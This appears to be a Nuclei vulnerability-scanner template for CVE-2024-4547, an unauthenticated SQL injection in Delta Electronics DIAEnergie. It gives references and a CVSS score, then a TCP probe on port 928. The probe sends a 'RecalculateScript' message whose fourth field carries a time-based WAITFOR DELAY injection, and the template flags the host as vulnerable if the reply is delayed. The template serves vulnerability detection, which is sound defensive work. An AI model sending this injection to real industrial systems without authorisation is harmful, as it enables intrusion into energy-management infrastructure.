id: CVE-2024-4547

info:
  name: Delta Electronics DIAEnergie - Unauthenticated SQL Injection
  author: songyaeji
  severity: critical
  description: |
    A SQLi vulnerability exists in Delta Electronics DIAEnergie v1.10.1.8610 and prior when CEBC.exe processes a 'RecalculateScript' message,
    which is splitted into 4 fields using the '~' character as the separator. An unauthenticated remote attacker can perform SQLi via the fourth field
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-4547
    - https://www.tenable.com/security/research/tra-2024-13
    - https://downloadcenter.deltaww.com/downloadCenterCounter.aspx?DID=39969&DocPath=1&hl=en-US
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-4547
    cwe-id: CWE-89, CWE-20
  metadata:
    verified: true
    max-request: 1
  tags: cve, cve2024, delta, DIAEnergie, tcp 928, sqli, rce, unauth

variables:
  sleep_seconds: 5

tcp:
  - host:
      - "{{Hostname}}"
    port: 928
    inputs:
      - data: "RecalculateScript~2024-01-01 00:00:00~2024-01-02 00:00:00~1); WAITFOR DELAY '0:0:{{sleep_seconds}}';--\n"
    matchers:
      - type: dsl
        dsl:
          - "duration >= {{sleep_seconds}}"